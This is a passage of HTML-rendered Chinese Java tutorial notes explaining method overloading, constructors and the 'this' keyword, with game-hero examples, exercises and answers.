punctuation">)</span><span class="token punctuation">;</span>        bh<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"赏金猎人"</span><span class="token punctuation">;</span>         <span class="token class-name">Hero</span> h1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        h1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"盖伦"</span><span class="token punctuation">;</span>        <span class="token class-name">Hero</span> h2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        h2<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"提莫"</span><span class="token punctuation">;</span>         bh<span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span>h1<span class="token punctuation">)</span><span class="token punctuation">;</span>        bh<span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span> h2<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h4><p>设计一个类Support (辅助英雄)继承Hero，提供一个heal(治疗)方法<br>对Support的heal方法进行重载<br>heal()<br>heal(Hero h) //为指定的英雄加血<br>heal(Hero h, int hp) //为指定的英雄加了hp的血<br>heal(int hp,Hero…Heros)//为n个指定英雄加了hp的血</p><h4 id="答案-2"><a href="#答案-2" class="headerlink" title="答案"></a>答案</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">Hero</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Support</span> <span class="token keyword">extends</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">"对某位英雄进行了治疗"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">"对"</span> <span class="token operator">+</span>h<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"进行了治疗"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h<span class="token punctuation">,</span><span class="token keyword">int</span> hp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">"给"</span> <span class="token operator">+</span>h<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"加了"</span><span class="token operator">+</span>hp<span class="token operator">+</span><span class="token string">"hp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token keyword">int</span> hp<span class="token punctuation">,</span><span class="token class-name">Hero</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token class-name">Heros</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token class-name">Heros</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">"给"</span> <span class="token operator">+</span><span class="token class-name">Heros</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"加了"</span><span class="token operator">+</span>hp<span class="token operator">+</span><span class="token string">"hp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">Support</span> qn<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Support</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qn<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">"琴女"</span><span class="token punctuation">;</span><span class="token class-name">Hero</span> ys<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ys<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">"亚索"</span><span class="token punctuation">;</span><span class="token class-name">Hero</span> tm<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tm<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">"提莫"</span><span class="token punctuation">;</span>qn<span class="token punctuation">.</span><span class="token function">heal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qn<span class="token punctuation">.</span><span class="token function">heal</span><span class="token punctuation">(</span>ys<span class="token punctuation">)</span><span class="token punctuation">;</span>qn<span class="token punctuation">.</span><span class="token function">heal</span><span class="token punctuation">(</span>tm<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qn<span class="token punctuation">.</span><span class="token function">heal</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> tm<span class="token punctuation">,</span>ys<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><h4 id="构造方法-1"><a href="#构造方法-1" class="headerlink" title="构造方法"></a>构造方法</h4><p>方法名和类名一样（包括大小写）<br><strong>没有返回类型</strong><br>实例化一个对象的时候，必然调用构造方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>     <span class="token class-name">String</span> name<span class="token punctuation">;</span>     <span class="token keyword">float</span> hp<span class="token punctuation">;</span>     <span class="token keyword">float</span> armor<span class="token punctuation">;</span>     <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span>     <span class="token comment">// 方法名和类名一样（包括大小写）</span>    <span class="token comment">// 没有返回类型</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"实例化一个对象的时候，必然调用构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//实例化一个对象的时候，必然调用构造方法</span>        <span class="token class-name">Hero</span> h <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="隐藏的构造方法"><a href="#隐藏的构造方法" class="headerlink" title="隐藏的构造方法"></a>隐藏的构造方法</h4><p>Hero类的构造方法是</p><p><code>public Heo()&#123;</code>  </p><p><code>&#125;</code><br>这个无参的构造方法，如果不写，就会默认提供一个</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>         <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>         <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>         <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>         <span class="token comment">//这个无参的构造方法，如果不写，</span>    <span class="token comment">//就会默认提供一个无参的构造方法</span>    <span class="token comment">//  public Hero()&#123; </span>    <span class="token comment">//      System.out.println("调用Hero的构造方法");</span>    <span class="token comment">//  &#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> garen <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        garen<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"盖伦"</span><span class="token punctuation">;</span>        garen<span class="token punctuation">.</span>hp <span class="token operator">=</span> <span class="token number">616.28f</span><span class="token punctuation">;</span>        garen<span class="token punctuation">.</span>armor <span class="token operator">=</span> <span class="token number">27.536f</span><span class="token punctuation">;</span>        garen<span class="token punctuation">.</span>moveSpeed <span class="token operator">=</span> <span class="token number">350</span><span class="token punctuation">;</span>                 <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        teemo<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"提莫"</span><span class="token punctuation">;</span>        teemo<span class="token punctuation">.</span>hp <span class="token operator">=</span> <span class="token number">383f</span><span class="token punctuation">;</span>        teemo<span class="token punctuation">.</span>armor <span class="token operator">=</span> <span class="token number">14f</span><span class="token punctuation">;</span>        teemo<span class="token punctuation">.</span>moveSpeed <span class="token operator">=</span> <span class="token number">330</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="有参的构造方法"><a href="#有参的构造方法" class="headerlink" title="有参的构造方法"></a>有参的构造方法</h4><p>一旦提供了一个有参的构造方法<br>同时又<strong>没有显式</strong>的提供一个无参的构造方法<br>那么默认的无参的构造方法，就“木有了“</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>          <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>          <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>          <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>          <span class="token comment">//有参的构造方法</span>    <span class="token comment">//默认的无参的构造方法就失效了</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> heroname<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         name <span class="token operator">=</span> heroname<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>          <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> garen <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"盖伦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//无参的构造方法“木有了”</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="构造方法的重载"><a href="#构造方法的重载" class="headerlink" title="构造方法的重载"></a>构造方法的重载</h4><p>构造方法也是可以重载的</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>           <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>           <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>           <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>           <span class="token comment">//带一个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> heroname<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         name <span class="token operator">=</span> heroname<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token comment">//带两个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> heroname<span class="token punctuation">,</span><span class="token keyword">float</span> herohp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         name <span class="token operator">=</span> heroname<span class="token punctuation">;</span>        hp <span class="token operator">=</span> herohp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>           <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> garen <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"盖伦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span><span class="token number">383</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h4><p>为Hero设计4个参数的构造方法<br>这四个参数分别是<br>String heroName<br>float heroHP<br>float heroArmor<br>int heroMoveSpeed</p><h4 id="答案-3"><a href="#答案-3" class="headerlink" title="答案"></a>答案</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> heroName<span class="token punctuation">,</span><span class="token keyword">float</span> heroHP<span class="token punctuation">,</span><span class="token keyword">float</span> heroArmor<span class="token punctuation">,</span><span class="token keyword">int</span> heroMoveSpeed<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"英雄:"</span><span class="token operator">+</span>heroName <span class="token operator">+</span><span class="token string">" 血线"</span><span class="token operator">+</span>heroHP<span class="token operator">+</span><span class="token string">" 护甲"</span><span class="token operator">+</span> heroArmor<span class="token operator">+</span><span class="token string">" 移动步长:"</span><span class="token operator">+</span>heroMoveSpeed<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> h22 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"盖伦"</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><h4 id="this即代表当前对象"><a href="#this即代表当前对象" class="headerlink" title="this即代表当前对象"></a>this即代表当前对象</h4><p>this这个关键字，相当于普通话里的“<strong>我</strong>”</p><p>小明说 “我吃了” 这个时候，“<strong>我</strong>” 代表小明<br>小红说 “我吃了” 这个时候，“<strong>我</strong>” 代表小红<br>“<strong>我</strong>“代表当前人物</p><p><strong>this</strong>这个关键字，相当于普通话里的“<strong>我</strong>”<br><strong>this即代表当前对象</strong></p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/597.png" alt="597" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>         <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>         <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>         <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>     <span class="token comment">//打印内存中的虚拟地址</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">showAddressInMemory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"打印this看到的虚拟地址："</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> garen <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        garen<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"盖伦"</span><span class="token punctuation">;</span>        <span class="token comment">//直接打印对象，会显示该对象在内存中的虚拟地址</span>        <span class="token comment">//格式：Hero@c17164 c17164即虚拟地址，每次执行，得到的地址不一定一样</span>         <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"打印对象看到的虚拟地址："</span><span class="token operator">+</span>garen<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//调用showAddressInMemory，打印该对象的this，显示相同的虚拟地址</span>        garen<span class="token punctuation">.</span><span class="token function">showAddressInMemory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        teemo<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"提莫"</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"打印对象看到的虚拟地址："</span><span class="token operator">+</span>teemo<span class="token punctuation">)</span><span class="token punctuation">;</span>        teemo<span class="token punctuation">.</span><span class="token function">showAddressInMemory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="通过this访问对象的属性"><a href="#通过this访问对象的属性" class="headerlink" title="通过this访问对象的属性"></a>通过this访问对象的属性</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>         <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>         <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>         <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>     <span class="token comment">//参数名和属性名一样</span>    <span class="token comment">//在方法体中，只能访问到参数name</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName1</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token comment">//为了避免setName1中的问题，参数名不得不使用其他变量名</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName2</span><span class="token punctuation">(</span><span class="token class-name">String</span> heroName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        name <span class="token operator">=</span> heroName<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token comment">//通过this访问属性</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName3</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//name代表的是参数name</span>        <span class="token comment">//this.name代表的是属性name</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span>  h <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 h<span class="token punctuation">.</span><span class="token function">setName1</span><span class="token punctuation">(</span><span class="token string">"teemo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                 h<span class="token punctuation">.</span><span class="token function">setName2</span><span class="token punctuation">(</span><span class="token string">"garen"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                     h<span class="token punctuation">.</span><span class="token function">setName3</span><span class="token punctuation">(</span><span class="token string">"死歌"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="通过this调用其他的构造方法"><a href="#通过this调用其他的构造方法" class="headerlink" title="通过this调用其他的构造方法"></a>通过this调用其他的构造方法</h4><p>如果要在一个构造方法中，调用另一个构造方法，可以使用this()</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>            <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>            <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>            <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>            <span class="token comment">//带一个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"一个参数的构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>          <span class="token comment">//带两个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"两个参数的构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hp <span class="token operator">=</span> hp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token 